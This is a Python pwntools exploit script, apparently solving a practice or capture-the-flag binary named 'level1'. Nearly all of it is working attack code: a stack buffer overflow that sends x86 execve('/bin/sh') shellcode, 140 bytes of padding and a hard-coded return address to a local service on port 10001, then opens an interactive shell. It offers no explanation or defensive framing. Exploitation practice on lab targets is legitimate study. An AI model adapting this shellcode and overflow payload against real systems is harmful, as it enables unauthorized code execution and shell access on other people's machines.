#!/usr/bin/env python
from pwn import *

#p = process('./level1')
p = remote('127.0.0.1',10001)
ret = 0xbffff1e0

# execve ("/bin/sh") 
# xor ecx, ecx
# mul ecx
# push ecx
# push 0x68732f2f   ;; hs//
# push 0x6e69622f   ;; nib/
# mov ebx, esp
# mov al, 11
# int 0x80

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

payload =  shellcode + 'A' * (140 - len(shellcode))   + p32(ret)

p.send(payload)

p.interactive()


